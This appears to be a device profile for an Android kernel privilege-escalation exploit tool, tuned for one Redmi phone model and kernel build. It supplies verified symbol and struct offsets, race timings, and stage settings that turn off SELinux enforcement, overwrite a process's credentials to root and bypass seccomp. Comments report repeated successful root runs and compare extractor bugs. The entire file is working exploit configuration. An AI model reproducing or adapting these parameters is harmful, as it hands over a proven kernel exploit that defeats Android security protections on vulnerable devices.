# =====================================================================
# GhostLock kernel profile — Redmi Note 13 Pro 5G (garnet, SM7435)
# Kernel: 5.10.236-android12-9-00003-gfb24cf99ad97-ab14313284
# Base template: Redmi K50 Ultra (diting, SM8475) — same 5.10.236 GKI.
#
# ✅ VERIFIED ON GARNET (successful runs):
#
#   A) caps_count=5 + collisions=8  -> successful (app context)
#      profile digest=0x1ae95c6f59734bb3
#      Evidence: "child is root!", "KernelSU ready", exit code=0
#
#   B) caps_count=3 + collisions=8  -> successful (app context)
#      profile digest=0x5113b570f88ef05d
#      Evidence: "child is root!", "KernelSU ready", exit code=0
#
#   C) caps_count=5 + collisions=4 + Shizuku -> successful
#      REQUIRES Shizuku (W3 skipped).
#      profile digest=0xe931c9bc6a1f50c7
#      Evidence: "child is root!", "KernelSU ready", exit code=0,
#                "no app seccomp filter (adb/shell flow); skipping W3"
#
#   D) caps_count=3 + collisions=4 + Shizuku -> successful
#      REQUIRES Shizuku (W3 skipped).
#      profile digest=0x5113b570f88ef05d
#      Evidence: "child is root!", "KernelSU ready", exit code=0,
#                "no app seccomp filter (adb/shell flow); skipping W3"
#
# ALL FOUR COMBINATIONS WORK. The only constraint:
#   - collisions=4 REQUIRES Shizuku (W3 skipped).
#   - collisions=8 works in both app and Shizuku contexts.
#
# ACTIVE BUILD: caps_count=5 + collisions=8 (combination A, the most
# proven). This is the recommended default for app context.
# For Shizuku context, all four combinations work.
#
# =====================================================================
# ⚠️ EXTRACTOR TOOL ISSUE — two different extractors were tested on the
# same boot.img + xbl_config.img + uefi.img. Their outputs differ:
#
#   v1 — Haoyu-UT extractor (BEST; use this as the reference):
#     kernel_phys_load   = 0xA8000000  ✅ (correct)
#     kernel_phys_offset = 0x80600000  ❌ (WRONG — from UEFI, not DRAM base;
#                                         must be corrected to 0x80000000)
#     task_struct        = filled from diting template ✅
#     cred               = filled from diting template ✅
#     collisions         = 8 ✅ (diting template value, not measured)
#     slide_loggers_0_1  = 41489008 ✅
#
#   v2 — YuKongA/ghostlock-app extractor (PR #721) — UNUSABLE:
#     kernel_phys_load   = 0xA7F00000  ❌ (WRONG — 0x10000 shift)
#     kernel_phys_offset = 0x80600000  ❌ (WRONG)
#     task_struct        = ALL null    ❌ (unusable)
#     cred               = ALL null    ❌ (unusable)
#     collisions         = 4 ❌ (PR #721 recommendation, NOT optimal
#                                  for app context — see note below)
#     slide_loggers_0_1  = 41489000 ❌ (old +0x10 heuristic)
#
#   The v2 output is completely unusable (null task_struct/cred). The v1
#   output is usable after one manual correction: change
#   kernel_phys_offset from 0x80600000 to 0x80000000.
#
#   The REAL values were taken from the official Haoyu-UT profile at:
#   https://github.com/Haoyu-UT/robust-ghostlock-app/blob/91ceeeac984179fb0d381b60d965fe64ff044af2/app/src/main/assets/kernel_profiles/5.10.236-android12-9-00003-gfb24cf99ad97-ab14313284.conf
#
#   That profile is device-verified (2026-10-08):
#     - offset.* symbols: exact match vs on-device /proc/kallsyms
#     - task_struct.* / cred.* fields: live kprobe reads
#     - kernel_phys_load = "Kernel code" start from /proc/iomem (0xa8000000)
#     - kernel_phys_offset = DRAM base (0x80000000)
#     - copy_size 168 confirmed via /sys/kernel/slab/cred_jar/object_size
#     - ref*_image rebased to KIMAGE_TEXT_BASE (0xffffffc080000000)
#     - route geometry confirmed live (kprobe trace 2026-10-08)
#     - kernelsnitch.mm_struct_sz = 960 measured from /proc/slabinfo
#
#   The values in THIS profile are exactly that Haoyu-UT profile, with
#   one exception: collisions is kept at 8 (as in Haoyu-UT), and the
#   profile adds the on-device-verified combinations A/B/C/D below.
#
# ⚠️ COLLISIONS NOTE:
#   The official extractor v2 (following PR #721) emits collisions=4.
#   However, collisions=8 is the BETTER value for app context on garnet:
#     - collisions=8: successful (combination A, caps=5)
#                     successful (combination B, caps=3)
#     - collisions=4: with app context (no Shizuku): prints "error 255"
#                     frequently, W3 fails.
#                     with Shizuku (shell): successful (C, caps=5)
#                                           successful (D, caps=3)
#   PR #721 lowered collisions to 4 based on its 5.10.198 test image.
#   That has NOT been confirmed as better on 5.10.236 garnet app context.
#   If you use the official extractor's output, change collisions to 8
#   for app context, or use Shizuku + collisions=4.
#
# Action for the project: the official extractor should be fixed to
# (a) not emit kernel_phys_offset from UEFI, (b) always emit a
# non-null task_struct/cred on 5.10.236, (c) use the corrected
# slide_loggers_0_1, and (d) emit collisions=8 (or leave it out and
# let the native default apply) — PR #721's collisions=4 is not
# optimal for app context on 5.10.236 garnet.
# =====================================================================
#
# Rejected values (proven to fail or unverified on garnet):
#   - kernel_phys_load   = 0xA7F00000  -> failed W1 15/15 (0x10000 shift)
#   - kernel_phys_offset = 0x80600000  -> UEFI-derived, never appeared in a
#                                         successful run; must be 0x80000000
#   - slide_nfulnl_logger= 41490232    -> only in the failed run; 41489208
#                                         is proven
#   - task_struct/cred   = null        -> extractor v2 output before PR #721
#                                         fix; unusable
#   - collisions         = 4 (app)     -> prints "error 255" frequently,
#                                         W3 fails. Works only with Shizuku.
# =====================================================================
release = "5.10.236-android12-9-00003-gfb24cf99ad97-ab14313284"
schema_version = 1
kernel_major = 5

# W1 scratch / SELinux state — Garnet verified
selinux {
  enforcing = 0
  initialized = 2
}

w1_scratch {
  image = 44279296
}

recommend_shizuku = 0

# ---------------------------------------------------------------------
# CRITICAL VALUES — all confirmed on garnet
# ---------------------------------------------------------------------
# kernel_phys_load:
#   0xA8000000 (2818572288) = physical start of "Kernel code" (_stext).
#   Confirmed on garnet by successful logs:
#     init_cred offset = 0x27B0A60 (41618016)
#     W1 target offset = 0x2A42B90 (44313488)
#     delta            = 0x28000000
#   Runtime addresses observed in logs (offset + KASLR slide, NOT the
#   offsets themselves):
#     init_cred runtime address = ffffff802a7b0a60
#     W1 target runtime address = ffffff802aa42b90
#   REJECTED: 0xA7F00000 (2818506752). The one run that used it failed
#   all 15 W1 attempts with "route returned clean but the write did not
#   verify" because every address was shifted by 0x10000.
#   NOTE: The official extractor v2 emits 0xA7F00000. This is the
#   extractor bug documented above.
kernel_phys_load = 2818572288

# kernel_phys_offset:
#   0x80000000 (2147483648) = DRAM base for Qualcomm SoCs. Present in
#   every garnet log (successful and failed) as phys_offset=0000000080000000.
#   REJECTED: 0x80600000 (2154037248). BOTH the official extractor (v1/v2,
#   PR #721) AND the Haoyu-UT extractor emit it from the UEFI memory map.
#   PR #721 "Known issue": kernel_phys_offset has no guard and is
#   overwritten from whatever iomem source is readable. It never appeared
#   in any successful garnet run.
kernel_phys_offset = 2147483648

route {
  select_stack {
    # Frame geometry: pselect uses 0xa0+0x1c0, futex uses 0x90+0x70+0x1a0;
    # both objects land at stack depth 0x210, so the delta is 0 and the
    # waiter shift is -2. Confirmed by kprobe trace 2026-10-08.
    waiter_shift = -2
    compact_waiter = 1

    # .bss anchor: image offset 0x2a3a590 (44279184). Zero, writable,
    # reference-free region (fs/coredump.c). Confirmed on garnet: every
    # successful W1p/W2/W3 used image +0x2a3a590.
    # Delete this line to fall back to the reclaimed-page behaviour.
    lock_anchor_image = 44279184

    # 0x1000 = 4096 is the anchor array itself. 0x20 = 32 is
    # sizeof(struct rt_mutex) under this build's lock-debug config.
    # 4096/32 = 128 slots per boot.
    lock_anchor_bytes = 4096
    lock_anchor_stride = 32
  }
}

fallback {
  to = "none"
}

# =====================================================================
# EXECUTION — timing, CPU pair, stages, heap, handoff
# =====================================================================
execution {
  # Preferred CPUs: 4/5 (big cores) = faster race.
  # On garnet, both pairs work in successful logs:
  #   - 4/5 accepted in some runs.
  #   - 0/1 accepted in other runs.
  # When 4/5 is rejected by the cpuset, the app falls back to 0/1
  # automatically. Source: https://github.com/Haoyu-UT/robust-ghostlock-app
  # "Fully page-free" table: Redmi K50 Ultra (diting) 5.10.236 select_stack
  # completed 10/10 in 13.8–15.9 s.
  selected_cpus {
    main = 4
    consumer = 5
  }
  recommended_cpus {
    main = 0
    consumer = 1
  }

  race {
    # Waiter park timeout and settle window. The exposure window is
    # exactly (route_wait_ms - setup_settle_us) = 30 - 10 = 20ms.
    # Requeue lands at settle+1.3ms in every kprobe trace.
    # Confirmed on garnet: all successful logs show 30 / 10000.
    # Source: https://github.com/Haoyu-UT/robust-ghostlock-app
    #   "A stage that cannot finish stops. ... A stage that cannot
    #    complete now stops and reports where it stopped."
    # Revert: route_wait_ms = 100, setup_settle_us = 50000.
    route_wait_ms = 30
    setup_settle_us = 10000

    # Poll interval and overall timeout for the state machine.
    state_poll_interval_us = 1000
    route_done_timeout_ms = 300000
  }

  routes {
    select_stack {
      # Attempt-1 consumer walk fires 5ms after route start.
      # Values <5ms (tested 2ms) cause rb_insert_color NULL-deref because
      # the walk runs before the erase pollutes the tree. Values >5ms let
      # ambient touchers hit the detach residue.
      # Confirmed on garnet: all successful logs show 5000.
      # Source: https://github.com/Haoyu-UT/robust-ghostlock-app
      #   "The main routes no longer depend on a sprayed page. ... The lock
      #    used for the write now sits in a fixed, all-zero region of the
      #    kernel."
      #   "A correct profile runs at the full success rate its route is
      #    capable of."
      enter_delay_us = 5000
      consumer_max_calls = 1
      consumer_burst_calls = 1
      timeout_us = 200000
    }
  }

  stages {
    # W1 (SELinux): skipped entirely if the device is already permissive
    # (seen in several successful runs). Otherwise up to 15 attempts.
    w1_attempts = 15
    w1_settle_us = 100000
    w1_scratch_repair_attempts = 3

    # W2 (cred): writes uid=0 into the child task's cred.
    # Confirmed on garnet: all successful runs needed 1 attempt.
    w2_attempts = 15
    w2_settle_us = 100000

    # W3 (seccomp): up to 3 chain rounds, 6 attempts each.
    # Confirmed on garnet: all successful logs completed W3,
    # except the Shizuku runs which skipped W3 entirely:
    #   "[+] no app seccomp filter (adb/shell flow); skipping W3"
    w3_chain_rounds = 3
    w3_attempts = 6
    w3_settle_us = 50000
  }

  heap {
    # prepare_max_attempts=4 was needed on garnet: some runs required 3
    # attempts, others required 4. Lowering it to 2 would have failed.
    prepare_max_attempts = 4
    prepare_timeout_ms = 240000
    kernelsnitch_timeout_ms = 60000
  }

  handoff {
    # Wait for the module to load after the exploit completes.
    # Confirmed on garnet: KernelSU loaded in all successful logs.
    pre_dispatch_settle_ms = 2000
    module_poll_attempts = 30
    module_poll_interval_ms = 100
    enforce_poll_attempts = 200
    enforce_poll_interval_ms = 100
  }
}

# =====================================================================
# KERNELSNITCH — mm_struct leak geometry
# =====================================================================
kernelsnitch {
  # collisions = 8 is the proven value on garnet for app context.
  #
  # ⚠️ collisions = 4 REQUIRES Shizuku:
  #   - Without Shizuku (app context, seccomp filter present):
  #       prints "error 255" frequently, W3 fails. Never completes.
  #   - With Shizuku (shell context, no seccomp filter):
  #       succeeds; W3 is skipped ("no app seccomp filter; skipping W3").
  #   The reason: collisions=4 leaves W3 as the only path to seccomp
  #   bypass, and W3 fails in app context. Shizuku skips W3 entirely,
  #   so collisions=4 works there.
  collisions = 8

  # 960 bytes = device-measured SLUB stride (0x3c0) for mm_struct on 5.10.
  # PR #721 confirms: three unrelated 5.10 images pass 0x3c0 to
  # kmem_cache_create_usercopy in mm_cache_init. The 1024/1280 values are
  # template defaults or Sony-specific and made the leak fail.
  mm_struct_sz = 960
}

# =====================================================================
# TASK_STRUCT — offsets verified via live kprobe reads
# =====================================================================
task_struct {
  prio = 132
  normal_prio = 140
  sched_task_group = 784
  pi_lock = 2156
  pi_waiters = 2176
  pi_top_task = 2192
  pi_blocked_on = 2200
  pid = 1480
  tgid = 1484
  atomic_flags = 1424
  real_cred = 1912
  cred = 1920
  comm = 1936
  tasks = 1224
  seccomp = 2120
}

# =====================================================================
# CRED — capability block
# =====================================================================
cred {
  # 168 bytes = confirmed via /sys/kernel/slab/cred_jar/object_size.
  copy_size = 168

  # refcount pinned at 256 so the rooted cred can never be freed
  # ("immortal this boot" in every successful garnet run).
  usage_offset = 0
  usage_value = 256

  # caps_count — tested values that work on garnet:
  #
  #   caps_count=5 + collisions=8  -> successful (app context)
  #      profile digest=0x1ae95c6f59734bb3
  #
  #   caps_count=3 + collisions=8  -> successful (app context)
  #      profile digest=0x5113b570f88ef05d
  #
  #   caps_count=5 + collisions=4 + Shizuku -> successful
  #      REQUIRES Shizuku. profile digest=0xe931c9bc6a1f50c7
  #
  #   caps_count=3 + collisions=4 + Shizuku -> successful
  #      REQUIRES Shizuku. profile digest=0x5113b570f88ef05d
  #
  # The active value below is 5 (the diting template default).
  # caps_count=3 also works with collisions=8, and with collisions=4
  # under Shizuku.
  #
  # NOTE: The official extractor v2 emits caps_count=null (unusable), and
  # v1 emits caps_count=5 from the diting template. The Haoyu-UT extractor
  # also emits 5. Neither extractor emits 3 automatically; 3 comes from
  # PR #721's measured init_cred and was applied manually.
  #
  # Note on prior failures: caps_count=3 also failed twice in W3
  # (not W2) when the device was hot and anchor slots were reused.
  # Those failures were not caused by caps_count; a fresh boot plus a
  # cool device fixed them. A fresh boot is required so the anchor
  # slots start at 0.
  caps_offset = 40
  caps_count = 5
  caps_value = 2199023255551

  # Three ref* pointers rebased to KIMAGE_TEXT_BASE (0xffffffc080000000)
  # so data_alias() accepts them. Confirmed on garnet: ref0/ref1/ref2
  # matched live kprobe reads in all successful runs.
  ref_count = 3
  ref0_offset = 128
  ref0_image = -272688810528
  ref1_offset = 136
  ref1_image = -272688810376
  ref2_offset = 144
  ref2_image = -272688805112
  ref3_offset = 0
  ref3_image = 0
}

# =====================================================================
# OFFSET — symbol offsets from _text (verified vs /proc/kallsyms)
# =====================================================================
offset {
  init_task = 41533056
  init_cred = 41618016
  empty_zero_page = 43573248
  root_task_group = 43593792
  selinux_enforcing = 44313488
  selinux_blob_sizes = 36659328
  security_hook_heads = 36657640

  # slide_nfulnl_logger: 0x2791C38 (41489208). Required for slide
  # detection. REJECTED: 0x2792038 (41490232) appeared only in the
  # failed run and shifted the logger by 0x400.
  # PR #721 fixed off_slide_loggers_0_1 from loggers+0x10 to loggers+8.
  # NOTE: The official extractor v2 emits 41489000 (old +0x10 heuristic).
  # The Haoyu-UT extractor emits the corrected 41489008.
  slide_nfulnl_logger = 41489208

  # slide_loggers_0_1: 0x2791BF0 (41489008). Required for the
  # loggers+0x10 heuristic fallback when BTF is unavailable.
  # Confirmed on garnet: matched in all successful logs.
  # NOTE: The official extractor v2 emits 41489000 (wrong). v1 and the
  # Haoyu-UT extractor emit 41489008.
  slide_loggers_0_1 = 41489008

  slide_boot_id = 44440509
}
